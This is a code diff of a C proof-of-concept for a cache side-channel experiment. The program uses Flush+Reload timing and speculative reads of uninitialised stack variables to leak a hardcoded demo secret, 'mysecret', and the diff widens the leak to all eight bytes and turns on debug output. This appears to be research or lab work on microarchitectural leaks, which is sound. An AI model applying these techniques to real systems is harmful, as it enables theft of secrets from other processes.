@@ -9,7 +9,7 @@
 #define REPETITIONS 1
 #define CACHE_HIT 100
 #define MAYBE_CACHE_HIT 175
-#define SECRET_SIZE 1
+#define SECRET_SIZE 8
 #define N_TRAINING 10
 #define SECRET "mysecret"
 #define false 0
@@ -21,37 +21,44 @@
 
 cp_t* flush_reload_arr;
 volatile cp_t cp;   //cache page declared out of function to keep stack identical to init_func()
+int __attribute__((aligned(ALIGNED_SIZE))) init_cp;
 
 __attribute__((noinline)) void init_func(int val) {
-    cp = flush_reload_arr[1];
+    //cp = flush_reload_arr[91];
     volatile char __attribute__ ((aligned (ALIGNED_SIZE))) x = val;
-    //printf("init  \t%p:\t%d\n", &x, x);
+    printf("init  \t%p:\t%d\n", &x, x);
 }
 
 __attribute__((noinline)) void uninit_func() {
-    cp = flush_reload_arr[0];
+    //cp = flush_reload_arr[01];
     volatile char __attribute__ ((aligned (ALIGNED_SIZE))) x;
     cp = flush_reload_arr[x];
-    //printf("uninit\t%p:\t%d\n", &x, x);
+    printf("uninit\t%p:\t%d\n", &x, x);
 }
 
 //static inline void victim_func(char init) {
 __attribute__((noinline)) void victim_func(char init) {
     int val = 5;
+    init_cp = init;
 
     //flush((void*)&val);
-    flush((void*)&init);
+    flush((void*)&init_cp);
     cpuid();
 
-    if(init==1) init_func(val);
-    else if (init==0) {uninit_func();}
-    else cp = flush_reload_arr[2];
+    if(init_cp) {
+        //cp = flush_reload_arr[90];
+        init_func(val);
+    }
+    else {
+        //cp = flush_reload_arr[00];
+        uninit_func();
+    }
 
 }
 
 void touch_secret(int secret_index) {
     volatile char __attribute__ ((aligned (ALIGNED_SIZE))) s = SECRET[secret_index];
-    //printf("secret\t%p:\t%d\n", &s, s);
+    printf("secret\t%p:\t%d\n", &s, s);
 }
 
 int* prepare(int secret_index) {
@@ -71,11 +78,12 @@ int* prepare(int secret_index) {
     for(int i = 0; i < n_accesses; i++) {
         touch_secret(secret_index);
         victim_func(init_indices[i]);
-
+        cpuid();
         if(init_indices[i] == false) {
             cpuid();
             flush_arr((void*)flush_reload_arr, N_PAGES);
         }
+        cpuid();
 
     }
 
@@ -107,14 +115,14 @@ int main(int argc, char** argv) {
     srand(time(0));
     int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints
 
-    results[0][0] = prepare(0);
-    /*for(int r = 0; r < REPETITIONS; r++) {
+    //results[0][0] = prepare(0);
+    for(int r = 0; r < REPETITIONS; r++) {
         printf("\nREPETITION %d\n", r);
         for (int s = 0; s < SECRET_SIZE; s++) {
             results[r][s] = prepare(s);
             cpuid();
         }
-    }*/
+    }//*/
 
     print_results(results, REPETITIONS, SECRET_SIZE, N_PAGES, CACHE_HIT);
 
